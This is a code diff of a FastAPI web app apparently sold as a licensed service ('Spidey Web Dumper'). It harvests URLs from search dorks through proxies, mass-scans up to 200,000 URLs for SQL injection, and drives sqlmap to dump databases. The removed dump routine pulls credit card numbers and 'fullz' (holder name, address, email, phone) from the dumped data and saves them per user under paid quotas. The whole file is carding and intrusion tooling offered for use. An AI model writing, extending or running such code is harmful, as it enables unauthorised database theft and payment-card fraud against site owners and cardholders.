+        update_progress(tid, msg=f"Parsing {total} dorks...", total=total)
         proxies = get_user_proxies(uid)
         add_log(tid, f"Using {len(proxies)} proxies")
+
         from core.url_finder import search_urls_from_dorks
-        last_edit = [0.0]
-        async def on_prog(done, total, found, retries):
-            now = time.time()
-            if now - last_edit[0] < 1.5:
+        last_edit = [time.time()]
+
+        async def on_prog(done, tot, found, retries):
+            if is_cancelled(tid):
                 return
-            last_edit[0] = now
-            update_progress(tid, done=done, total=total, found=found, msg=f"Scanned {done}/{total} | Found {found}")
+            now = time.time()
+            if now - last_edit[0] >= 1.0:
+                last_edit[0] = now
+                update_progress(tid, done=done, total=tot, found=found,
+                                msg=f"Scanned {done}/{tot} | Found {found}")
+
         urls = await search_urls_from_dorks(dorks, limit=200_000, progress_callback=on_prog, proxy_list=proxies)
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"urls_{len(urls)}_{ts}.txt", "\n".join(urls))
         consume_quota(uid, "urls", len(urls))
         save_last_response(uid, "parser", {"dorks": len(dorks), "urls": len(urls), "file": fname})
         update_task(tid, status="done", result={"dorks": len(dorks), "urls": len(urls), "file": fname})
-        update_progress(tid, done=len(dorks), total=len(dorks), found=len(urls), msg="✅ Done!")
+        update_progress(tid, done=total, total=total, found=len(urls), msg="✅ Done!")
+        add_log(tid, f"✅ Found {len(urls)} URLs")
     except Exception as e:
-        logger.exception(f"[parser] {e}")
+        logger.exception(f"[parser:{tid}] ERROR")
         update_task(tid, status="error", error=str(e))
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  API — PROXY
+#  PROXY CHECK
+# ═══════════════════════════════════════════════════════════════════════════
+@app.post("/api/proxy/check")
+async def api_proxy_check(request: Request):
+    uid = require_user(request)
+    proxies = get_user_proxies(uid)
+    if not proxies:
+        return JSONResponse({"error": "No proxies to check"}, status_code=400)
+    tid = new_task(uid, "proxy_check", {"total": len(proxies)})
+    logger.info(f"[proxy] Task {tid} for {len(proxies)} proxies")
+    asyncio.create_task(_run_proxy_check(tid, uid, proxies))
+    return {"task_id": tid}
+
+
+async def _run_proxy_check(tid: str, uid: str, proxies: List[str]):
+    try:
+        total = len(proxies)
+        logger.info(f"[proxy:{tid}] STARTED")
+        update_task(tid, status="running")
+        update_progress(tid, done=0, total=total, live=0, msg=f"Checking {total} proxies...")
+        add_log(tid, f"Checking {total} proxies")
+
+        from core.proxy import check_proxies_bulk
+        last_edit = [time.time()]
+
+        async def on_prog(checked, tot, live):
+            if is_cancelled(tid):
+                return
+            now = time.time()
+            if now - last_edit[0] >= 0.8:
+                last_edit[0] = now
+                update_progress(tid, done=checked, total=tot, live=live,
+                                msg=f"Checked {checked}/{tot} | Live {live}")
+
+        try:
+            live_list = await check_proxies_bulk(proxies, timeout=5.0, concurrency=300,
+                                                 progress_callback=on_prog, task_id=tid)
+        except TypeError:
+            live_list = await check_proxies_bulk(proxies, timeout=5.0, concurrency=300,
+                                                 progress_callback=on_prog)
+
+        if is_cancelled(tid):
+            add_log(tid, "⛔ Cancelled")
+            update_progress(tid, msg="⛔ Cancelled")
+            return
+
+        dead_count = total - len(live_list)
+        save_user_proxies(uid, live_list)
+        save_proxy_stats(uid, live=len(live_list), dead=dead_count, total=total)
+        save_last_response(uid, "proxy_check", {"checked": total, "live": len(live_list), "dead": dead_count})
+        update_task(tid, status="done", result={"checked": total, "live": len(live_list), "dead": dead_count})
+        update_progress(tid, done=total, total=total, live=len(live_list), msg="✅ Done!")
+        add_log(tid, f"✅ Live: {len(live_list)}/{total}")
+        logger.info(f"[proxy:{tid}] DONE")
+    except Exception as e:
+        logger.exception(f"[proxy:{tid}] ERROR")
+        update_task(tid, status="error", error=str(e))
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  PROXY CRUD
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/proxy/add")
 async def api_proxy_add(request: Request, proxies: str = Form("")):
@@ -1031,8 +1324,8 @@ async def api_proxy_add(request: Request, proxies: str = Form("")):
         if p not in seen:
             seen.add(p); current.append(p); added += 1
     save_user_proxies(uid, current)
-    save_last_response(uid, "proxy_add", {"added": added, "total": len(current)})
     return {"ok": True, "added": added, "duplicate": len(parsed) - added, "total": len(current)}
+
 
 @app.post("/api/proxy/import")
 async def api_proxy_import(request: Request, file: UploadFile = File(...)):
@@ -1040,7 +1333,6 @@ async def api_proxy_import(request: Request, file: UploadFile = File(...)):
     content = await file.read()
     fname = (file.filename or "").lower()
     from core.proxy import parse_proxy_text, parse_proxy_from_zip
-    proxies = []
     if fname.endswith(".zip"):
         proxies = parse_proxy_from_zip(content)
     else:
@@ -1060,29 +1352,6 @@ async def api_proxy_import(request: Request, file: UploadFile = File(...)):
     save_user_proxies(uid, current)
     return {"ok": True, "added": added, "total": len(current)}
 
-@app.post("/api/proxy/check")
-async def api_proxy_check(request: Request):
-    uid = require_user(request)
-    proxies = get_user_proxies(uid)
-    if not proxies:
-        return JSONResponse({"error": "No proxies to check"}, status_code=400)
-    
-    logger.info(f"[proxy_check] User {uid} requested check of {len(proxies)} proxies")
-    tid = new_task(uid, "proxy_check", {"total": len(proxies)})
-    
-    task = asyncio.create_task(_run_proxy_check(tid, uid, proxies))
-    
-    def _on_done(t):
-        try:
-            t.result()
-        except Exception as e:
-            logger.exception(f"[proxy_check] Task {tid} crashed")
-            update_task(tid, status="error", error=f"Crash: {str(e)[:200]}")
-    
-    task.add_done_callback(_on_done)
-    return {"task_id": tid}
-
-
 
 @app.post("/api/proxy/clear")
 async def api_proxy_clear(request: Request):
@@ -1090,6 +1359,7 @@ async def api_proxy_clear(request: Request):
     save_user_proxies(uid, [])
     save_proxy_stats(uid, 0, 0, 0)
     return {"ok": True, "total": 0}
+
 
 @app.post("/api/proxy/remove")
 async def api_proxy_remove(request: Request, proxies: str = Form(...)):
@@ -1101,6 +1371,7 @@ async def api_proxy_remove(request: Request, proxies: str = Form(...)):
     save_user_proxies(uid, new)
     return {"ok": True, "removed": removed, "total": len(new)}
 
+
 @app.get("/api/proxy/list")
 async def api_proxy_list(request: Request):
     uid = require_user(request)
@@ -1108,36 +1379,25 @@ async def api_proxy_list(request: Request):
     stats = get_proxy_stats(uid)
     return {"ok": True, "proxies": proxies, "count": len(proxies), "stats": stats}
 
-@app.get("/api/proxy/stats")
-async def api_proxy_stats(request: Request):
-    uid = require_user(request)
-    return get_proxy_stats(uid)
-
 # ═══════════════════════════════════════════════════════════════════════════
-#  API — SQLI (MAIN FIX HERE)
+#  SQLI
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/sqli/scan")
 async def api_sqli_scan(request: Request, urls: str = Form(...)):
     uid = require_user(request)
-    
-    # ✅ ROBUST PARSING
     raw = urls.replace("\r\n", "\n").replace("\r", "\n")
     raw_lines = raw.split("\n")
-    
     url_list = []
     for line in raw_lines:
         u = line.strip().strip("\ufeff").strip()
         if not u:
             continue
-        if not u.startswith(("http://", "https://")):
-            if u.startswith(("www.", "http:/", "https:/")):
-                if not u.startswith("http"):
-                    u = "https://" + u.lstrip("/")
-            else:
-                continue
-        url_list.append(u)
-    
-    # Dedupe
+        if u.startswith(("http://", "https://")):
+            url_list.append(u)
+        elif u.startswith(("www.", "http:/", "https:/")):
+            if not u.startswith("http"):
+                u = "https://" + u.lstrip("/")
+            url_list.append(u)
     seen = set()
     unique = []
     for u in url_list:
@@ -1145,48 +1405,28 @@ async def api_sqli_scan(request: Request, urls: str = Form(...)):
             seen.add(u)
             unique.append(u)
     url_list = unique
-    
     logger.info(f"[sqli] {len(raw_lines)} lines → {len(url_list)} valid URLs")
-    
     if not url_list:
         return JSONResponse({"error": f"No valid URLs. Got {len(raw_lines)} lines"}, status_code=400)
-    
     if len(url_list) > 200_000:
         url_list = url_list[:200_000]
-    
     allowed, remaining = check_quota(uid, "sqli", len(url_list))
     if not allowed:
         return JSONResponse({"error": f"Quota exceeded. Remaining: {remaining}"}, status_code=429)
-    
     tid = new_task(uid, "sqli", {"total": len(url_list)})
-    logger.info(f"[sqli] Task {tid} created with {len(url_list)} URLs")
-    
-    task = asyncio.create_task(_run_sqli(tid, uid, url_list))
-    
-    def _on_done(t):
-        try:
-            t.result()
-        except Exception as e:
-            logger.exception(f"[sqli] Task {tid} crashed")
-            update_task(tid, status="error", error=f"Crash: {str(e)[:200]}")
-    
-    task.add_done_callback(_on_done)
+    asyncio.create_task(_run_sqli(tid, uid, url_list))
     return {"task_id": tid, "total": len(url_list)}
 
 
 async def _run_sqli(tid: str, uid: str, urls: List[str]):
-    """🎯 CLEAN SQLi Scanner"""
     try:
         total = len(urls)
-        logger.info(f"[sqli:{tid}] STARTED with {total} URLs")
-        
+        logger.info(f"[sqli:{tid}] STARTED")
         update_task(tid, status="running")
         update_progress(tid, done=0, total=total, found=0, msg=f"Scanning {total} URLs...")
         add_log(tid, f"Testing {total} URLs")
-
         proxies = get_user_proxies(uid)
         add_log(tid, f"Using {len(proxies)} proxies")
-        logger.info(f"[sqli:{tid}] Proxies: {len(proxies)}")
 
         if len(proxies) >= 5:
             add_log(tid, "⚡ Filtering live proxies...")
@@ -1197,7 +1437,6 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
                 add_log(tid, f"✅ Live: {len(live)}/{len(proxies)}")
                 proxies = live if live else []
             except Exception as e:
-                logger.exception(f"[sqli:{tid}] Proxy filter failed")
                 add_log(tid, f"⚠️ Filter failed: {str(e)[:60]}")
                 proxies = []
 
@@ -1206,48 +1445,41 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
 
         from core.sqli import check_urls_bulk
         last_edit = [time.time()]
-        
+
         async def on_prog(done, tot, found):
             if is_cancelled(tid):
                 return
             now = time.time()
             if now - last_edit[0] >= 1.0:
                 last_edit[0] = now
-                update_progress(tid, done=done, total=tot, found=found, msg=f"Tested {done}/{tot} | VULN {found}")
-        
-        update_progress(tid, msg=f"Scanning {total} URLs...")
-        logger.info(f"[sqli:{tid}] Calling check_urls_bulk...")
-        
-        inj = await check_urls_bulk(
-            urls, proxies=proxies, concurrency=80, timeout=6.0,
-            progress_callback=on_prog, task_id=tid,
-        )
-        
-        logger.info(f"[sqli:{tid}] Returned {len(inj)} vulnerable")
-        
+                update_progress(tid, done=done, total=tot, found=found,
+                                msg=f"Tested {done}/{tot} | VULN {found}")
+
+        try:
+            inj = await check_urls_bulk(urls, proxies=proxies, concurrency=80, timeout=6.0,
+                                         progress_callback=on_prog, task_id=tid)
+        except TypeError:
+            inj = await check_urls_bulk(urls, proxies=proxies, concurrency=80, timeout=6.0,
+                                         progress_callback=on_prog)
+
         if is_cancelled(tid):
             add_log(tid, "⛔ Cancelled")
             update_progress(tid, msg="⛔ Cancelled")
             return
-        
+
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"vuln_{len(inj)}_{ts}.txt", "\n".join(inj))
         consume_quota(uid, "sqli", total)
         save_last_response(uid, "sqli", {"tested": total, "vuln": len(inj), "file": fname})
         update_task(tid, status="done", result={"tested": total, "vuln": len(inj), "file": fname})
         update_progress(tid, done=total, total=total, found=len(inj), msg="✅ Done!")
-        add_log(tid, f"✅ Found {len(inj)} vulnerable URLs")
-        logger.info(f"[sqli:{tid}] DONE — {len(inj)} vulns")
-    except asyncio.CancelledError:
-        add_log(tid, "⛔ Cancelled")
-        update_progress(tid, msg="⛔ Cancelled")
+        add_log(tid, f"✅ Found {len(inj)} vulns")
     except Exception as e:
         logger.exception(f"[sqli:{tid}] ERROR")
         update_task(tid, status="error", error=str(e))
-        add_log(tid, f"❌ Error: {str(e)[:200]}")
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  API — DUMP
+#  DUMP (with alldumps.txt)
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/dump/run")
 async def api_dump_run(request: Request, urls: str = Form(...), level: int = Form(3),
@@ -1272,62 +1504,12 @@ async def api_dump_run(request: Request, urls: str = Form(...), level: int = For
     asyncio.create_task(_run_dump(tid, uid, url_list, level, risk, threads, technique, tamper, crawl))
     return {"task_id": tid}
 
-async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, crawl):
-    try:
-        update_task(tid, status="running")
-        update_progress(tid, total=len(urls), msg="Starting sqlmap...")
-        proxies = get_user_proxies(uid)
-        from core.sqlmap_api import api_dump_multiple
-        from core.fullz import extract_fullz_from_dir, fullz_records_to_lines
-        all_cards = set()
-        all_fullz = []
-        last_edit = [0.0]
-        async def on_prog(done, total, success):
-            now = time.time()
-            if now - last_edit[0] < 1.5: return
-            last_edit[0] = now
-            update_progress(tid, done=done, total=total, cards=len(all_cards), fullz=len(all_fullz), msg=f"Dumped {done}/{total} | CC {len(all_cards)} | Fullz {len(all_fullz)}")
-        async def on_result(r, zip_bytes):
-            if r.cards:
-                for c in r.cards: all_cards.add(c)
-            try:
-                src = r.csv_dir or ""
-                if src and os.path.isdir(src):
-                    recs = extract_fullz_from_dir(src)
-                    if recs: all_fullz.extend(recs)
-            except Exception: pass
-            add_log(tid, f"✅ {r.url[:60]} | CC: {len(r.cards)}")
-        await api_dump_multiple(urls, proxy_list=proxies, level=level, risk=risk, technique=technique, threads=threads, tamper=tamper, crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result)
-        all_cards = list(all_cards)
-        ts = datetime.now().strftime("%d%m%y_%H%M%S")
-        result = {}
-        if all_cards:
-            cc_name = save_output(uid, f"cards_{len(all_cards)}_{ts}.txt", "\n".join(all_cards))
-            result["cards_file"] = cc_name
-            result["cards"] = len(all_cards)
-            consume_quota(uid, "cards", len(all_cards))
-        if all_fullz:
-            seen = set(); dedup = []
-            for rec in all_fullz:
-                key = (rec.cc_number, rec.holder_name, rec.zip, rec.email)
-                if key in seen: continue
-                seen.add(key); dedup.append(rec)
-            rich = [r for r in dedup if r.holder_name or r.address or r.zip or r.email or r.phone]
-            if rich:
-                fz_name = save_output(uid, f"fullz_{len(rich)}_{ts}.txt", "\n".join(fullz_records_to_lines(rich, "full")))
-                result["fullz_file"] = fz_name
-                result["fullz"] = len(rich)
-                consume_quota(uid, "fullz", len(rich))
-        consume_quota(uid, "dumps", len(urls))
-        save_last_response(uid, "dump", {"tested": len(urls), "cards": result.get("cards", 0), "fullz": result.get("fullz", 0), "cards_file": result.get("cards_file", ""), "fullz_file": result.get("fullz_file", "")})
-        update_task(tid, status="done", result=result)
-        update_progress(tid, done=len(urls), total=len(urls), cards=result.get("cards", 0), fullz=result.get("fullz", 0), msg="✅ Done!")
-    except Exception as e:
-        logger.exception(f"[dump] {e}")
-        update_task(tid, status="error", error=str(e))
+
+
+
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  API — TASK STATUS & CANCEL
+#  TASK STATUS & CANCEL
 # ═══════════════════════════════════════════════════════════════════════════
 @app.get("/api/task/{tid}")
 async def api_task_status(request: Request, tid: str):
@@ -1341,6 +1523,7 @@ async def api_task_status(request: Request, tid: str):
             raise HTTPException(status_code=403, detail="Not your task")
     return t
 
+
 @app.post("/api/task/{tid}/cancel")
 async def api_task_cancel(request: Request, tid: str):
     uid = require_user(request)
@@ -1352,6 +1535,7 @@ async def api_task_cancel(request: Request, tid: str):
     add_log(tid, "⛔ Cancelled by user")
     return {"ok": True}
 
+
 @app.get("/api/tasks/active")
 async def api_tasks_active(request: Request):
     uid = require_user(request)
@@ -1359,16 +1543,6 @@ async def api_tasks_active(request: Request):
         if t["uid"] == uid and t["status"] in ("starting", "running"):
             return {"task_id": tid, "task": t}
     return {"task_id": None}
-
-@app.get("/api/tasks/recent")
-async def api_tasks_recent(request: Request):
-    uid = require_user(request)
-    user_tasks = [
-        {"id": t["id"], "type": t["type"], "status": t["status"], "started": t["started"], "progress": t["progress"]}
-        for t in TASKS.values() if t["uid"] == uid
-    ]
-    user_tasks.sort(key=lambda x: x["started"], reverse=True)
-    return {"tasks": user_tasks[:20]}
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  DOWNLOAD / FILES
@@ -1386,6 +1560,7 @@ async def download_file(request: Request, fname: str):
         raise HTTPException(status_code=403, detail="Access denied")
     return FileResponse(fpath, filename=fname, media_type="text/plain")
 
+
 @app.post("/api/files/delete")
 async def api_files_delete(request: Request, fname: str = Form(...)):
     uid = require_user(request)
@@ -1397,7 +1572,8 @@ async def api_files_delete(request: Request, fname: str = Form(...)):
     fpath = os.path.join(OUTPUT_DIR, fname)
     if os.path.isfile(fpath):
         try:
-            os.remove(fpath); return {"ok": True}
+            os.remove(fpath)
+            return {"ok": True}
         except Exception as e:
             return JSONResponse({"error": str(e)}, status_code=500)
     return JSONResponse({"error": "Not found"}, status_code=404)
@@ -1421,7 +1597,7 @@ async def api_settings_password(request: Request, old_password: str = Form(...),
     return {"ok": True}
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  ROUTES — ADMIN
+#  ADMIN
 # ═══════════════════════════════════════════════════════════════════════════
 @app.get(ADMIN_PATH, response_class=HTMLResponse)
 async def admin_panel(request: Request):
@@ -1431,12 +1607,14 @@ async def admin_panel(request: Request):
     active_users = sum(1 for u in users.values() if u.get("expires") and u.get("expires") > datetime.now().isoformat())
     return render("admin.html", {"request": request, "uid": uid, "total_users": len(users), "active_users": active_users, "total_keys": len(keys), "plans": PLANS})
 
+
 @app.get(ADMIN_PATH + "/keys", response_class=HTMLResponse)
 async def admin_keys(request: Request, msg: str = None):
     uid = require_admin(request)
     keys = load_keys()
     items = sorted(keys.items(), key=lambda x: x[1].get("created", ""), reverse=True)
     return render("admin_keys.html", {"request": request, "uid": uid, "keys": items, "msg": msg, "plans": PLANS})
+
 
 @app.post(ADMIN_PATH + "/keys/generate")
 async def admin_keys_generate(request: Request, plan: str = Form(...), count: int = Form(1)):
@@ -1447,19 +1625,23 @@ async def admin_keys_generate(request: Request, plan: str = Form(...), count: in
     keys = load_keys()
     for _ in range(count):
         k = generate_license_key()
-        while k in keys: k = generate_license_key()
+        while k in keys:
+            k = generate_license_key()
         keys[k] = {"plan": plan, "label": PLANS[plan]["label"], "created": datetime.now().isoformat(), "created_by": uid, "used_by": None}
     save_keys(keys)
     return RedirectResponse(f"{ADMIN_PATH}/keys?msg=Generated+{count}+keys", status_code=302)
+
 
 @app.post(ADMIN_PATH + "/keys/revoke")
 async def admin_keys_revoke(request: Request, key: str = Form(...)):
     uid = require_admin(request)
     keys = load_keys()
     if key in keys:
-        del keys[key]; save_keys(keys)
+        del keys[key]
+        save_keys(keys)
         return RedirectResponse(f"{ADMIN_PATH}/keys?msg=Revoked", status_code=302)
     return RedirectResponse(f"{ADMIN_PATH}/keys?msg=Not+found", status_code=302)
+
 
 @app.get(ADMIN_PATH + "/users", response_class=HTMLResponse)
 async def admin_users(request: Request, msg: str = None):
@@ -1468,6 +1650,7 @@ async def admin_users(request: Request, msg: str = None):
     items = sorted(users.items(), key=lambda x: x[1].get("created", ""), reverse=True)
     return render("admin_users.html", {"request": request, "uid": uid, "users": items, "msg": msg})
 
+
 @app.post(ADMIN_PATH + "/users/delete")
 async def admin_users_delete(request: Request, username: str = Form(...)):
     uid = require_admin(request)
@@ -1475,9 +1658,11 @@ async def admin_users_delete(request: Request, username: str = Form(...)):
         return RedirectResponse(f"{ADMIN_PATH}/users?msg=Cannot+delete+admin", status_code=302)
     users = load_users()
     if username in users:
-        del users[username]; save_users(users)
+        del users[username]
+        save_users(users)
         return RedirectResponse(f"{ADMIN_PATH}/users?msg=Deleted", status_code=302)
     return RedirectResponse(f"{ADMIN_PATH}/users?msg=Not+found", status_code=302)
+
 
 @app.post(ADMIN_PATH + "/users/extend")
 async def admin_users_extend(request: Request, username: str = Form(...), plan: str = Form(...)):
@@ -1493,13 +1678,16 @@ async def admin_users_extend(request: Request, username: str = Form(...), plan: 
     if cur_exp:
         try:
             cur_dt = datetime.fromisoformat(cur_exp)
-            if cur_dt > base: base = cur_dt
-        except Exception: pass
+            if cur_dt > base:
+                base = cur_dt
+        except Exception:
+            pass
     users[username]["expires"] = (base + plan_data["delta"]).isoformat()
     users[username]["plan"] = plan
     users[username]["plan_label"] = plan_data["label"]
     save_users(users)
     return RedirectResponse(f"{ADMIN_PATH}/users?msg=Extended", status_code=302)
+
 
 @app.post(ADMIN_PATH + "/users/reset_password")
 async def admin_users_reset(request: Request, username: str = Form(...), new_password: str = Form(...)):
@@ -1509,10 +1697,11 @@ async def admin_users_reset(request: Request, username: str = Form(...), new_pas
         return RedirectResponse(f"{ADMIN_PATH}/users?msg=Not+found", status_code=302)
     ok, msg = check_strong_password(new_password)
     if not ok:
-        return RedirectResponse(f"{ADMIN_PATH}/users?msg={msg.replace(' ','+')}", status_code=302)
+        return RedirectResponse(f"{ADMIN_PATH}/users?msg={msg.replace(' ', '+')}", status_code=302)
     users[username]["password"] = new_password
     save_users(users)
     return RedirectResponse(f"{ADMIN_PATH}/users?msg=Password+reset", status_code=302)
+
 
 @app.post(ADMIN_PATH + "/users/clear_usage")
 async def admin_users_clear_usage(request: Request, username: str = Form(...)):
@@ -1524,18 +1713,6 @@ async def admin_users_clear_usage(request: Request, username: str = Form(...)):
     save_users(users)
     return RedirectResponse(f"{ADMIN_PATH}/users?msg=Usage+cleared", status_code=302)
 
-@app.get(ADMIN_PATH + "/broadcast", response_class=HTMLResponse)
-async def admin_broadcast_page(request: Request, msg: str = None):
-    uid = require_admin(request)
-    users = load_users()
-    return render("admin_broadcast.html", {"request": request, "uid": uid, "total_users": len(users), "msg": msg})
-
-@app.post(ADMIN_PATH + "/broadcast/send")
-async def admin_broadcast_send(request: Request, subject: str = Form(...), message: str = Form(...)):
-    uid = require_admin(request)
-    bcast_file = os.path.join(DATA_DIR, "broadcast.json")
-    _save_json(bcast_file, {"subject": subject, "message": message, "sent_at": datetime.now().isoformat(), "sent_by": uid})
-    return RedirectResponse(f"{ADMIN_PATH}/broadcast?msg=Broadcast+sent", status_code=302)
 
 @app.get(ADMIN_PATH + "/stats", response_class=HTMLResponse)
 async def admin_stats(request: Request):
@@ -1548,7 +1725,8 @@ async def admin_stats(request: Request):
         mem_str = f"{proc.memory_info().rss / 1024 / 1024:.1f} MB"
         cpu_str = f"{psutil.cpu_percent(interval=0.1):.1f}%"
     except Exception:
-        mem_str = "N/A"; cpu_str = "N/A"
+        mem_str = "N/A"
+        cpu_str = "N/A"
     import platform
     stats = {
         "total_users": len(users),
@@ -1569,30 +1747,30 @@ async def admin_stats(request: Request):
 # ═══════════════════════════════════════════════════════════════════════════
 @app.on_event("startup")
 async def on_startup():
-    logger.info("🕷️  Spidey Web Dumper starting...")
-    logger.info(f"📁 Data dir: {DATA_DIR}")
-    logger.info(f"📁 Output dir: {OUTPUT_DIR}")
-    logger.info(f"🛡️  Admin path: {ADMIN_PATH}")
+    logger.info("🕷️  Spidey starting...")
     load_users()
     load_keys()
     load_tasks_from_disk()
     try:
         from core.sqlmap_api import ensure_api_server
         asyncio.create_task(ensure_api_server())
-        logger.info("🔧 sqlmapapi starting...")
     except Exception as e:
         logger.warning(f"sqlmapapi start failed: {e}")
+
     async def _cleaner():
         while True:
             await asyncio.sleep(600)
-            try: cleanup_old_tasks(max_age_hours=24)
-            except Exception: pass
+            try:
+                cleanup_old_tasks(max_age_hours=24)
+            except Exception:
+                pass
     asyncio.create_task(_cleaner())
-    logger.info("✅ Spidey Web Dumper ready")
+    logger.info("✅ Spidey ready")
+
 
 @app.on_event("shutdown")
 async def on_shutdown():
-    logger.info("🕷️  Spidey shutting down...")
+    logger.info("🕷️  Shutting down...")
     try:
         save_tasks_to_disk()
     except Exception:
@@ -1600,11 +1778,14 @@ async def on_shutdown():
     try:
         from core.sqlmap_api import stop_api_server
         stop_api_server()
-    except Exception: pass
+    except Exception:
+        pass
+
 
 @app.get("/health")
 async def health():
     return {"status": "ok", "time": datetime.now().isoformat(), "tasks": len(TASKS)}
+
 
 if __name__ == "__main__":
     import uvicorn
